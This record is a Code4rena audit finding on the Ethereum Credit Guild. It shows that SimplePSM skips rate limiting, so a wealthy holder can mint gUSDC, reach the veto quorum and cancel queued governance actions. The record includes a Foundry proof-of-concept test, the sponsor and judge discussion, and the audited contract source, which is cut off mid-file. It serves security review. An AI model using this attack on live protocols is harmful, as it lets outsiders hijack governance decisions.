{
  "Title": "[M-21] `RateLimitedMinter` isn't used by `SimplePSM` resulting in Governance attacks",
  "Content": "\nThe following contracts in the protocol doesn't use `RateLimitedMinter`:\n\n- `SimplePSM` (actually, it [imports](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/SimplePSM.sol#L12) but never uses `RateLimitedMinter`).\n- `ProfitManager`\n\nFor the `SimplePSM` case, it leads to governance attacks. An attacker with a sufficient USDC balance can exploit this by minting an unlimited amount of gUSDC tokens in `SimplePSM` using USDC, bypassing the protocol's safety parameters ([1](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/test/proposals/gips/GIP\\_0.sol#L54), [2](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/test/proposals/gips/GIP\\_0.sol#L95), [3](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/test/proposals/gips/GIP\\_0.sol#L104)). This allows the attacker to propose or veto certain actions, compromising the governance process.\n\nIn the `ProfitManager` contract, the `notifyPnL()` function [burns](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/governance/ProfitManager.sol#L327) credit tokens, but the `RateLimitedMinter` buffer is never replenished (`ProfitManager` doesn't use rate limiter). On the other hand, the `LendingTerm` contract [uses](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/src/loan/LendingTerm.sol#L418) the `RateLimitedMinter` for minting credit tokens, resulting in the depletion of its buffer over time. This can lead to a shortage of tokens in the `RateLimitedMinter` buffer of `LendingTerm` contracts at some point.\n\n### Proof of Concept\n\n1. The `GuildVetoGovernor` contract allows to veto and cancel action in the queue by voting with gUSDC tokens. A [quorum](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/test/proposals/gips/GIP\\_0.sol#L104) of 5 million gUSDC is required.\n2. Alice possesses 6 million USDC tokens. She takes advantage of the fact that the `PSM` contract does not utilize a rate limiter and mints 6 million gUSDC tokens in the `PSM` contract.\n3. Alice then utilizes her newly acquired gUSDC tokens to vote in the `GuildVetoGovernor` contract and cancel any action in the queue.\n4. Alice can do minting and voting swiftly. In that case `ProfitManager.creditMultiplier` doesn't decline. This would allow Alice to redeem her 6 million USDC tokens back without any consequences.\n\n<details>\n\n```\n    // SPDX-License-Identifier: GPL-3.0-or-later\n    pragma solidity 0.8.13;\n\n    import {Test} from \"@forge-std/Test.sol\";\n    import {Core} from \"@src/core/Core.sol\";\n    import {CoreRoles} from \"@src/core/CoreRoles.sol\";\n    import {MockERC20} from \"@test/mock/MockERC20.sol\";\n    import {SimplePSM} from \"@src/loan/SimplePSM.sol\";\n    import {GuildToken} from \"@src/tokens/GuildToken.sol\";\n    import {CreditToken} from \"@src/tokens/CreditToken.sol\";\n    import {ProfitManager} from \"@src/governance/ProfitManager.sol\";\n    import {ProfitManager} from \"@src/governance/ProfitManager.sol\";\n    import {MockLendingTerm} from \"@test/mock/MockLendingTerm.sol\";\n\n    import {IGovernor} from \"@openzeppelin/contracts/governance/IGovernor.sol\";\n    import {GuildVetoGovernor} from \"@src/governance/GuildVetoGovernor.sol\";\n    import {GuildTimelockController} from \"@src/governance/GuildTimelockController.sol\";\n\n    import \"@forge-std/console.sol\";\n\n    contract Poc4 is Test {\n        Core private core;\n        ProfitManager private profitManager;\n        CreditToken credit;\n        GuildToken guild;\n        MockERC20 private pegToken;\n        SimplePSM private psm;\n\n        uint256 private constant _TIMELOCK_MIN_DELAY = 12345;\n\n        GuildTimelockController private timelock;\n        GuildVetoGovernor private vetoGovernor;\n\n        uint256 __lastCallValue = 0;\n\n        // From deployment script!\n        // https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/main/test/proposals/gips/GIP_0.sol#L104\n        uint256 private constant _VETO_QUORUM = 5_000_000e18;\n\n        function setUp() public {\n            vm.warp(1679067867);\n            vm.roll(16848497);\n            core = new Core();\n            profitManager = new ProfitManager(address(core));\n            credit = new CreditToken(address(core), \"gUSDC\", \"gUSDC\");\n            guild = new GuildToken(address(core), address(profitManager));\n            pegToken = new MockERC20(); // USDC\n            pegToken.setDecimals(6);\n            psm = new SimplePSM(\n                address(core),\n                address(profitManager),\n                address(credit),\n                address(pegToken)\n            );\n\n            timelock = new GuildTimelockController(\n                address(core),\n                _TIMELOCK_MIN_DELAY\n            );\n\n            // VetoGovernor for gUSDC\n            vetoGovernor = new GuildVetoGovernor(\n                address(core),\n                address(timelock),\n                address(credit),\n                _VETO_QUORUM // 5Mil gUSDC\n            );\n\n            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));\n            core.grantRole(CoreRoles.CREDIT_MINTER, address(psm));\n            core.grantRole(CoreRoles.CREDIT_GOVERNANCE_PARAMETERS, address(this));\n\n            core.createRole(CoreRoles.TIMELOCK_EXECUTOR, CoreRoles.GOVERNOR);\n            core.grantRole(CoreRoles.TIMELOCK_EXECUTOR, address(0));\n            core.createRole(CoreRoles.TIMELOCK_CANCELLER, CoreRoles.GOVERNOR);\n            core.grantRole(CoreRoles.TIMELOCK_CANCELLER, address(vetoGovernor));\n            core.createRole(CoreRoles.TIMELOCK_PROPOSER, CoreRoles.GOVERNOR);\n            core.grantRole(CoreRoles.TIMELOCK_PROPOSER, address(this));\n\n            core.renounceRole(CoreRoles.GOVERNOR, address(this));\n\n            credit.setMaxDelegates(1);\n        }\n\n        function __dummyCall(uint256 val) external {\n            __lastCallValue = val;\n        }\n\n        function _queueDummyTimelockAction(\n            uint256 number\n        ) internal returns (bytes32) {\n            address[] memory targets = new address[](1);\n            targets[0] = address(this);\n            uint256[] memory values = new uint256[](1);\n            bytes[] memory payloads = new bytes[](1);\n            payloads[0] = abi.encodeWithSelector(\n                Poc4.__dummyCall.selector,\n                number\n            );\n            bytes32 predecessor = bytes32(0);\n            bytes32 salt = keccak256(bytes(\"dummy call\"));\n            timelock.scheduleBatch(\n                targets,\n                values,\n                payloads,\n                predecessor,\n                salt,\n                _TIMELOCK_MIN_DELAY\n            );\n            bytes32 timelockId = timelock.hashOperationBatch(\n                targets,\n                values,\n                payloads,\n                0,\n                salt\n            );\n\n            return timelockId;\n        }\n\n        function test_poc() public {\n            address Alice = address(100);\n\n            // Schedule an action in the timelock, Alice will veto it.\n            bytes32 timelockId = _queueDummyTimelockAction(12345);\n\n            // Afluent Alice has 6Mil of USDC and mints gUSDC in PSM\n            // PSM isn't rate-limited (there is no cap)!\n            pegToken.mint(Alice, 6_000_000e6);\n            vm.startPrank(Alice);\n            pegToken.approve(address(psm), 6_000_000e6);\n            psm.mint(Alice, 6_000_000e6);\n            \n            // Alice has enough voting power!\n            require(credit.balanceOf(Alice) > vetoGovernor.quorum(0));\n\n            credit.delegate(Alice);\n\n            // Alice creates a Veto proposal\n            uint256 proposalId = vetoGovernor.createVeto(timelockId);\n\n            vm.roll(block.number + 1);\n            vm.warp(block.timestamp + 10);\n\n            // Alice cast a vote against\n            vetoGovernor.castVote(proposalId, uint8(GuildVetoGovernor.VoteType.Against));\n\n            vm.roll(block.number + 1);\n            vm.warp(block.timestamp + 10);\n\n            (\n                uint256 againstVotes,\n                uint256 forVotes,\n                uint256 abstainVotes\n            ) = vetoGovernor.proposalVotes(\n                proposalId\n            );\n\n            // There is a Quorum, Alice can execute Veto proposal\n            require(againstVotes > vetoGovernor.quorum(0));\n\n            vetoGovernor.executeVeto(timelockId);\n\n            vm.stopPrank();\n        }\n    }\n```\n\n</details>\n\nPut the Poc inside the `test/unit/governance/Poc4.t.sol` file and run it with the following command:\n\n    forge test --mp test/unit/governance/Poc4.t.sol --mt test_poc\n\n### Recommended Mitigation Steps\n\nUse rate limiter across all contracts in the protocol when minting or burning Credit and Guild tokens.\n\n### Assessed type\n\nGovernance\n\n**[eswak (Ethereum Credit Guild) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335#issuecomment-1882830076):**\n > > `SimplePSM` imports but never uses `RateLimitedMinter`.\n> \n> Thanks for pointing out this unused import, it has been removed. To give context: we removed the use of rate limits in the PSM, because it opened a griefing vector for borrowers : before a term goes into liquidations, borrowers could borrow and deplete the buffer, preventing new PSM mints. Then nobody could mint fresh gUSDC in the PSM to bid in the auctions, and auctions could be forced into reporting bad debt (due to no one being able to hold gUSDC and bid).\n> \n> The `RateLimitedMinter`'s `hardCap` only applies to borrows, so indeed there could be `$10M` of borrows in the system but `$20M` deposited by lenders in the PSM (leading to a 2x lower APR for depositors than what is paid by lenders), but that is the intended behavior and what allows the protocol to grow (redeemable tokens in the PSM is what invites new borrowers).\n> \n> USDC depositors in the PSM can only veto new changes in a given market, they can not propose new changes or prevent a safe wind down of the market.\n> \n> The `ProfitManager` does not replenish the buffer and that may be a low/QA finding, I'm not sure that needs a fix as this is only relating to the surplus buffer (that is expected to be small relative to the supply cap, because it is a percent of the percent of interest paid over time by the borrowed supply, and the buffer replenish speed is not expected to stay `0` for a long time on the credit token).\n> \n> The finding states that Alice can mint in the PSM and participate in the veto process, then redeem swiftly before `creditMultiplier` goes down, but she essentially becomes a lender in the meantime and her USDC can be redeemed against by borrowers, and she could end up 'stuck' with her gUSDC. Perhaps the fact that the veto process is fast (Alice could be holding gUSDC for as low as 2 blocks) is a problem and the commitment is not enough and some kind of lock up should be added. I'll mention my colleague @OneTrueKirk so he can weigh in on that.\n> \n> In any case, I am disagreeing with the severity (no user funds are at risk when someone decides to veto all changes on a given market).\n\n**[OneTrueKirk (Ethereum Credit Guild) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335#issuecomment-1883597855):**\n > I agree with Erwan's assessment that the issue should be marked as medium rather than high, since no user funds can be stolen and only updates can be halted with a lower capital cost than intended by the quorum threshold. Lockup appears to be an effective mitigation.\n\n**[TrungOre (judge) decreased severity to Medium](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335#issuecomment-1915395022)**\n\n**[Blckhv (warden) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335#issuecomment-1922499403):**\n > @TrungOre - Even if such a user manages to execute such an attack and onboard a malicious term, it can be resolved for a short amount of time by executing offboard proposal and restricting users from borrowing from this term.\n > \n > Sponsors mentioned that the funds cannot be redeemed because users will borrow part of them if the term has favorable conditions.\n> \n> Can you please recheck?\n\n**[TrungOre (judge) commented](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335#issuecomment-1928045359):**\n > @Blckhv - Regarding sponsor's statement, only the part about malicious voting action is accepted as med severity.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/335).*\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-12-ethereumcreditguild",
  "Code": [
    {
      "filename": "src/loan/SimplePSM.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\n\n/// @notice Simple PSM contract of the Ethereum Credit Guild, that allows mint/redeem\n/// of CREDIT token outside of lending terms & guarantee a stable peg of the CREDIT token\n/// around the value targeted by the protocol.\n/// The SimplePSM targets a value equal to ProfitManager.creditMultiplier(), so when bad\n/// debt is created and all loans are marked up, they stay the same in terms of peg token,\n/// because new CREDIT can be minted with fewer peg tokens from the PSM. Conversely, when\n/// new loans are issued, if there are funds available in the SimplePSM, borrowers know\n/// the amount of peg tokens they'll be able to redeem their borrowed CREDIT for.\n/// @dev inspired by the SimpleFeiDaiPSM used in the TribeDAO shutdown, see:\n/// - https://github.com/code-423n4/2022-09-tribe/blob/main/contracts/peg/SimpleFeiDaiPSM.sol\n/// - https://code4rena.com/reports/2022-09-tribe\ncontract SimplePSM is CoreRef {\n    using SafeERC20 for ERC20;\n\n    /// @notice reference to the ProfitManager contract\n    address public immutable profitManager;\n\n    /// @notice reference to the CreditToken contract\n    address public immutable credit;\n\n    /// @notice reference to the peg token contract\n    address public immutable pegToken;\n\n    /// @notice peg token balance, used to track sum of i/o and exclude donations.\n    /// invariant: pegToken.balanceOf(this) >= pegTokenBalance\n    uint256 public pegTokenBalance;\n\n    /// @notice multiplier for decimals correction, e.g. 1e12 for a pegToken\n    /// with 6 decimals (because CREDIT has 18 decimals)\n    uint256 public immutable decimalCorrection;\n\n    /// @notice true if the redemptions are currently paused\n    bool public redemptionsPaused;\n\n    /// @notice event emitted upon a redemption\n    event Redeem(\n        uint256 indexed when,\n        address indexed to,\n        uint256 amountIn,\n        uint256 amountOut\n    );\n    /// @notice event emitted when credit gets minted\n    event Mint(\n        uint256 indexed when,\n        address indexed to,\n        uint256 amountIn,\n        uint256 amountOut\n    );\n    /// @notice event emitted when redemption pausability status changes\n    event RedemptionsPaused(uint256 indexed when, bool status);\n\n    constructor(\n        address _core,\n        address _profitManager,\n        address _credit,\n        address _pegToken\n    ) CoreRef(_core) {\n        profitManager = _profitManager;\n        credit = _credit;\n        pegToken = _pegToken;\n\n        uint256 decimals = uint256(ERC20(_pegToken).decimals());\n        decimalCorrection = 10 ** (18 - decimals);\n    }\n\n    /// @notice calculate the amount of CREDIT out for a given `amountIn` of underlying\n    function getMintAmountOut(uint256 amountIn) public view returns (uint256) {\n        uint256 creditMultiplier = ProfitManager(profitManager)\n            .creditMultiplier();\n        return (amountIn * decimalCorrection * 1e18) / creditMultiplier;\n    }\n\n    /// @notice calculate the amount of underlying out for a given `amountIn` of CREDIT\n    function getRedeemAmountOut(\n        uint256 amountIn\n    ) public view returns (uint256) {\n        uint256 creditMultiplier = ProfitManager(profitManager)\n            .creditMultiplier();\n        return (amountIn * creditMultiplier) / 1e18 / decimalCorrection;\n    }\n\n    /// @notice calculate the total number of CREDIT that can be redeemed\n    /// at the moment, based on the pegTokenBalance.\n    function redeemableCredit() public view returns (uint256) {\n        return getMintAmountOut(pegTokenBalance);\n    }\n\n    /// @notice mint `amountOut` CREDIT to address `to` for `amountIn` underlying tokens\n    /// @dev see getMintAmountOut() to pre-calculate amount out\n    function mint(\n        address to,\n        uint256 amountIn\n    ) external whenNotPaused returns (uint256 amountOut) {\n        amountOut = getMintAmountOut(amountIn);\n        pegTokenBalance += amountIn;\n        ERC20(pegToken).safeTransferFrom(msg.sender, address(this), amountIn);\n        CreditToken(credit).mint(to, amountOut);\n        emit Mint(block.timestamp, to, amountIn, amountOut);\n    }\n\n    /// @notice mint `amountOut` CREDIT to `msg.sender` for `amountIn` underlying tokens\n    /// and enter rebase to earn the savings rate.\n    /// @dev see getMintAmountOut() to pre-calculate amount out\n    function mintAndEnterRebase(\n        uint256 amountIn\n    ) external whenNotPaused returns (uint256 amountOut) {\n        require(\n            !CreditToken(credit).isRebasing(msg.sender),\n            \"SimplePSM: already rebasing\"\n        );\n        amountOut = getMintAmountOut(amountIn);\n        pegTokenBalance += amountIn;\n        ERC20(pegToken).safeTransferFrom(msg.sender, address(this), amountIn);\n        CreditToken(credit).mint(msg.sender, amountOut);\n        CreditToken(credit).forceEnterRebase(msg.sender);\n        emit Mint(block.timestamp, msg.sender, amountIn, amountOut);\n    }\n\n    /// @notice redeem `amountIn` CREDIT for `amountOut` underlying tokens and send to address `to`\n    /// @dev see getRedeemAmountOut() to pre-calculate amount out\n    function redeem(\n        address to,\n        uint256 amountIn\n    ) external returns (uint256 amountOut) {\n        require(!redemptionsPaused, \"SimplePSM: redemptions paused\");\n        amountOut = getRedeemAmountOut(amountIn);\n        CreditToken(credit).burnFrom(msg.sender, amountIn);\n        pegTokenBalance -= amountOut;\n        ERC20(pegToken).safeTransfer(to, amountOut);\n        emit Redeem(block.timestamp, to, amountIn, amountOut);\n    }\n\n    /// @notice set `redemptionsPaused`\n    /// governor-only, to allow full governance to update the psm mechanisms,\n    /// or automated processes to pause redemptions under certain conditions.\n    function setRedemptionsPaused(\n        bool paused\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        redemptionsPaused = paused;\n        emit RedemptionsPaused(block.timestamp, paused);\n    }\n}"
    },
    {
      "filename": "src/governance/ProfitManager.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\n\n/** \n@title ProfitManager\n@author eswak\n@notice This contract manages profits generated in the system and how it is distributed\n    between the various stakeholders.\n\n    This contract also manages a surplus buffer, which acts as first-loss capital in case of\n    bad debt. When bad debt is created beyond the surplus buffer, this contract decrements\n    the `creditMultiplier` value held in its storage, which has the effect of reducing the\n    value of CREDIT everywhere in the system.\n\n    When a loan generates profit (interests), the profit is traced back to users voting for\n    this lending term (gauge), which subsequently allows pro-rata distribution of profits to\n    GUILD holders that vote for the most productive gauges.\n\n    Seniority stack of the debt, in case of losses :\n    - per term surplus buffer (donated to global surplus buffer when loss is reported)\n    - global surplus buffer\n    - finally, credit holders (by updating down the creditMultiplier)\n*/\ncontract ProfitManager is CoreRef {\n    /// @notice reference to GUILD token.\n    address public guild;\n\n    /// @notice reference to CREDIT token.\n    address public credit;\n\n    /// @notice reference to CREDIT token PSM.\n    address public psm;\n\n    /// @notice profit index of a given gauge\n    mapping(address => uint256) public gaugeProfitIndex;\n\n    /// @notice profit index of a given user in a given gauge\n    mapping(address => mapping(address => uint256)) public userGaugeProfitIndex;\n\n    /// @dev internal structure used to optimize storage read, public functions use\n    /// uint256 numbers with 18 decimals.\n    struct ProfitSharingConfig {\n        uint32 surplusBufferSplit; // percentage, with 9 decimals (!) that go to surplus buffer\n        uint32 guildSplit; // percentage, with 9 decimals (!) that go to GUILD holders\n        uint32 otherSplit; // percentage, with 9 decimals (!) that go to other address if != address(0)\n        address otherRecipient; // address receiving `otherSplit`\n    }\n\n    /// @notice configuration of profit sharing.\n    /// `surplusBufferSplit`, `guildSplit`, and `otherSplit` are expressed as percentages with 9 decimals,\n    /// so a value of 1e9 would direct 100% of profits. The sum should be <= 1e9.\n    /// The rest (if the sum of `guildSplit` + `otherSplit` is < 1e9) is distributed to lenders of the\n    /// system, CREDIT holders, through the rebasing mechanism (`CreditToken.distribute()`).\n    /// If `otherRecipient` is set to address(0), `otherSplit` must equal 0.\n    /// The share of profit to `otherRecipient` is sent through a regular ERC20.transfer().\n    /// This structure is optimized for storage packing, all external interfaces reference\n    /// percentages encoded as uint256 with 18 decimals.\n    ProfitSharingConfig internal profitSharingConfig;\n\n    /// @notice amount of first-loss capital in the system.\n    /// This is a number of CREDIT token held on this contract that can be used to absorb losses in\n    /// cases where a loss is reported through `notifyPnL`. The surplus buffer is depleted first, and\n    /// if the loss is greater than the surplus buffer, the `creditMultiplier` is updated down.\n    uint256 public surplusBuffer;\n\n    /// @notice amount of first-loss capital for a given term.\n    /// This is a number of CREDIT token held on this contract that can be used to absorb losses in\n    /// cases where a loss is reported through `notifyPnL` in a given term.\n    /// When a loss is reported in a given term, its termSuplusBuffer is donated to the general\n    /// surplusBuffer before calculating the loss.\n    mapping(address => uint256) public termSurplusBuffer;\n\n    /// @notice multiplier for CREDIT value in the system.\n    /// e.g. a value of 0.7e18 would mean that CREDIT has been discounted by 30% so far in the system,\n    /// and that all lending terms will allow 1/0.7=1.42 times more CREDIT to be borrowed per collateral\n    /// tokens, and all active debts are also affected by this multiplier during the update (e.g. if an\n    /// address owed 1000 CREDIT in an active loan, they now owe 1428 CREDIT).\n    /// The CREDIT multiplier can only go down (CREDIT can only lose value over time, when bad debt\n    /// is created in the system). To make CREDIT a valuable asset to hold, profits generated by the system\n    /// shall be redistributed to holders through a savings rate or another mechanism.\n    uint256 public creditMultiplier = 1e18;\n\n    /// @notice minimum size of CREDIT loans.\n    /// this parameter is here to ensure that the gas costs of liquidation do not\n    /// outsize minimum overcollateralization (which could result in bad debt\n    /// on otherwise sound loans).\n    /// This value is adjusted up when the creditMultiplier goes down.\n    uint256 internal _minBorrow = 100e18;\n\n    /// @notice tolerance on new borrows regarding gauge weights.\n    /// For a total supply or 100 credit, and 2 gauges each at 50% weight,\n    /// the ideal borrow amount for each gauge is 50 credit. To facilitate\n    /// growth of the protocol, a tolerance is allowed compared to the ideal\n    /// gauge weights.\n    /// This tolerance is expressed as a percentage with 18 decimals.\n    /// A tolerance of 1e18 (100% - or 0% deviation compared to ideal weights)\n    /// can result in a deadlock situation where no new borrows are allowed.\n    uint256 public gaugeWeightTolerance = 1.2e18; // 120%\n\n    constructor(address _core) CoreRef(_core) {\n        emit MinBorrowUpdate(block.timestamp, 100e18);\n    }\n\n    /// @notice emitted when a profit or loss in a gauge is notified.\n    event GaugePnL(address indexed gauge, uint256 indexed when, int256 pnl);\n\n    /// @notice emitted when surplus buffer is updated.\n    event SurplusBufferUpdate(uint256 indexed when, uint256 newValue);\n\n    /// @notice emitted when surplus buffer of a given term is updated.\n    event TermSurplusBufferUpdate(\n        uint256 indexed when,\n        address indexed term,\n        uint256 newValue\n    );\n\n    /// @notice emitted when CREDIT multiplier is updated.\n    event CreditMultiplierUpdate(uint256 indexed when, uint256 newValue);\n\n    /// @notice emitted when GUILD profit sharing is updated.\n    event ProfitSharingConfigUpdate(\n        uint256 indexed when,\n        uint256 surplusBufferSplit,\n        uint256 creditSplit,\n        uint256 guildSplit,\n        uint256 otherSplit,\n        address otherRecipient\n    );\n\n    /// @notice emitted when a GUILD member claims their CREDIT rewards.\n    event ClaimRewards(\n        uint256 indexed when,\n        address indexed user,\n        address indexed gauge,\n        uint256 amount\n    );\n\n    /// @notice emitted when minBorrow is updated\n    event MinBorrowUpdate(uint256 indexed when, uint256 newValue);\n\n    /// @notice emitted when gaugeWeightTolerance is updated\n    event GaugeWeightToleranceUpdate(uint256 indexed when, uint256 newValue);\n\n    /// @notice get the minimum borrow amount\n    function minBorrow() external view returns (uint256) {\n        return (_minBorrow * 1e18) / creditMultiplier;\n    }\n\n    /// @notice initialize references to GUILD & CREDIT tokens.\n    function initializeReferences(\n        address _credit,\n        address _guild,\n        address _psm\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        assert(\n            credit == address(0) && guild == address(0) && psm == address(0)\n        );\n        credit = _credit;\n        guild = _guild;\n        psm = _psm;\n    }\n\n    /// @notice returns the sum of all borrowed CREDIT, not including unpaid interests\n    /// and creditMultiplier changes that could make debt amounts higher than the initial\n    /// borrowed CREDIT amounts.\n    function totalBorrowedCredit() external view returns (uint256) {\n        return\n            CreditToken(credit).targetTotalSupply() -\n            SimplePSM(psm).redeemableCredit();\n    }\n\n    /// @notice set the minimum borrow amount\n    function setMinBorrow(\n        uint256 newValue\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        _minBorrow = newValue;\n        emit MinBorrowUpdate(block.timestamp, newValue);\n    }\n\n    /// @notice set the gauge weight tolerance\n    function setGaugeWeightTolerance(\n        uint256 newValue\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        gaugeWeightTolerance = newValue;\n        emit GaugeWeightToleranceUpdate(block.timestamp, newValue);\n    }\n\n    /// @notice set the profit sharing config.\n    function setProfitSharingConfig(\n        uint256 surplusBufferSplit,\n        uint256 creditSplit,\n        uint256 guildSplit,\n        uint256 otherSplit,\n        address otherRecipient\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        if (otherRecipient == address(0)) {\n            require(otherSplit == 0, \"GuildToken: invalid config\");\n        } else {\n            require(otherSplit != 0, \"GuildToken: invalid config\");\n        }\n        require(\n            surplusBufferSplit + otherSplit + guildSplit + creditSplit == 1e18,\n            \"GuildToken: invalid config\"\n        );\n\n        profitSharingConfig = ProfitSharingConfig({\n            surplusBufferSplit: uint32(surplusBufferSplit / 1e9),\n            guildSplit: uint32(guildSplit / 1e9),\n            otherSplit: uint32(otherSplit / 1e9),\n            otherRecipient: otherRecipient\n        });\n\n        emit ProfitSharingConfigUpdate(\n            block.timestamp,\n            surplusBufferSplit,\n            creditSplit,\n            guildSplit,\n            otherSplit,\n            otherRecipient\n        );\n    }\n\n    /// @notice get the profit sharing config.\n    function getProfitSharingConfig()\n        external\n        view\n        returns (\n            uint256 surplusBufferSplit,\n            uint256 creditSplit,\n            uint256 guildSplit,\n            uint256 otherSplit,\n            address otherRecipient\n        )\n    {\n        surplusBufferSplit =\n            uint256(profitSharingConfig.surplusBufferSplit) *\n            1e9;\n        guildSplit = uint256(profitSharingConfig.guildSplit) * 1e9;\n        otherSplit = uint256(profitSharingConfig.otherSplit) * 1e9;\n        creditSplit = 1e18 - surplusBufferSplit - guildSplit - otherSplit;\n        otherRecipient = profitSharingConfig.otherRecipient;\n    }\n\n    /// @notice donate to surplus buffer\n    function donateToSurplusBuffer(uint256 amount) external {\n        CreditToken(credit).transferFrom(msg.sender, address(this), amount);\n        uint256 newSurplusBuffer = surplusBuffer + amount;\n        surplusBuffer = newSurplusBuffer;\n        emit SurplusBufferUpdate(block.timestamp, newSurplusBuffer);\n    }\n\n    /// @notice donate to surplus buffer of a given term\n    function donateToTermSurplusBuffer(address term, uint256 amount) external {\n        CreditToken(credit).transferFrom(msg.sender, address(this), amount);\n        uint256 newSurplusBuffer = termSurplusBuffer[term] + amount;\n        termSurplusBuffer[term] = newSurplusBuffer;\n        emit TermSurplusBufferUpdate(block.timestamp, term, newSurplusBuffer);\n    }\n\n    /// @notice withdraw from surplus buffer\n    function withdrawFromSurplusBuffer(\n        address to,\n        uint256 amount\n    ) external onlyCoreRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW) {\n        uint256 newSurplusBuffer = surplusBuffer - amount; // this would revert due to underflow if withdrawing > surplusBuffer\n        surplusBuffer = newSurplusBuffer;\n        CreditToken(credit).transfer(to, amount);\n        emit SurplusBufferUpdate(block.timestamp, newSurplusBuffer);\n    }\n\n    /// @notice withdraw from surplus buffer of a given term\n    function withdrawFromTermSurplusBuffer(\n        address term,\n        address to,\n        uint256 amount\n    ) external onlyCoreRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW) {\n        uint256 newSurplusBuffer = termSurplusBuffer[term] - amount; // this would revert due to underflow if withdrawing > termSurplusBuffer\n        termSurplusBuffer[term] = newSurplusBuffer;\n        CreditToken(credit).transfer(to, amount);\n        emit TermSurplusBufferUpdate(block.timestamp, term, newSurplusBuffer);\n    }\n\n    /// @notice notify profit and loss in a given gauge\n    /// if `amount` is > 0, the same number of CREDIT tokens are expected to be transferred to this contract\n    /// before `notifyPnL` is called.\n    function notifyPnL(\n        address gauge,\n        int256 amount\n    ) external onlyCoreRole(CoreRoles.GAUGE_PNL_NOTIFIER) {\n        uint256 _surplusBuffer = surplusBuffer;\n        uint256 _termSurplusBuffer = termSurplusBuffer[gauge];\n        address _credit = credit;\n\n        // handling loss\n        if (amount < 0) {\n            uint256 loss = uint256(-amount);\n\n            // save gauge loss\n            GuildToken(guild).notifyGaugeLoss(gauge);\n\n            // deplete the term surplus buffer, if any, and\n            // donate its content to the general surplus buffer\n            if (_termSurplusBuffer != 0) {\n                termSurplusBuffer[gauge] = 0;\n                emit TermSurplusBufferUpdate(block.timestamp, gauge, 0);\n                _surplusBuffer += _termSurplusBuffer;\n            }\n\n            if (loss < _surplusBuffer) {\n                // deplete the surplus buffer\n                surplusBuffer = _surplusBuffer - loss;\n                emit SurplusBufferUpdate(\n                    block.timestamp,\n                    _surplusBuffer - loss\n                );\n                CreditToken(_credit).burn(loss);\n            } else {\n                // empty the surplus buffer\n                loss -= _surplusBuffer;\n                surplusBuffer = 0;\n                CreditToken(_credit).burn(_surplusBuffer);\n                emit SurplusBufferUpdate(block.timestamp, 0);\n\n                // update the CREDIT multiplier\n                uint256 creditTotalSupply = CreditToken(_credit).totalSupply();\n                uint256 newCreditMultiplier = (creditMultiplier *\n                    (creditTotalSupply - loss)) / creditTotalSupply;\n                creditMultiplier = newCreditMultiplier;\n                emit CreditMultiplierUpdate(\n                    block.timestamp,\n                    newCreditMultiplier\n                );\n            }\n        }\n        // handling profit\n        else if (amount > 0) {\n            ProfitSharingConfig\n                memory _profitSharingConfig = profitSharingConfig;\n\n            uint256 amountForSurplusBuffer = (uint256(amount) *\n                uint256(_profitSharingConfig.surplusBufferSplit)) / 1e9;\n\n            uint256 amountForGuild = (uint256(amount) *\n                uint256(_profitSharingConfig.guildSplit)) / 1e9;\n\n            uint256 amountForOther = (uint256(amount) *\n                uint256(_profitSharingConfig.otherSplit)) / 1e9;\n\n            uint256 amountForCredit = uint256(amount) -\n                amountForSurplusBuffer -\n                amountForGuild -\n                amountForOther;\n\n            // distribute to surplus buffer\n            if (amountForSurplusBuffer != 0) {\n                surplusBuffer = _surplusBuffer + amountForSurplusBuffer;\n                emit SurplusBufferUpdate(\n                    block.timestamp,\n                    _surplusBuffer + amountForSurplusBuffer\n                );\n            }\n\n            // distribute to other\n            if (amountForOther != 0) {\n                CreditToken(_credit).transfer(\n                    _profitSharingConfig.otherRecipient,\n                    amountForOther\n                );\n            }\n\n            // distribute to lenders\n            if (amountForCredit != 0) {\n                CreditToken(_credit).distribute(amountForCredit);\n            }\n\n            // distribute to the guild\n            if (amountForGuild != 0) {\n                // update the gauge profit index\n                // if the gauge has 0 weight, does not update the profit index, this is unnecessary\n                // because the profit index is used to reattribute profit to users voting for the gauge,\n                // and if 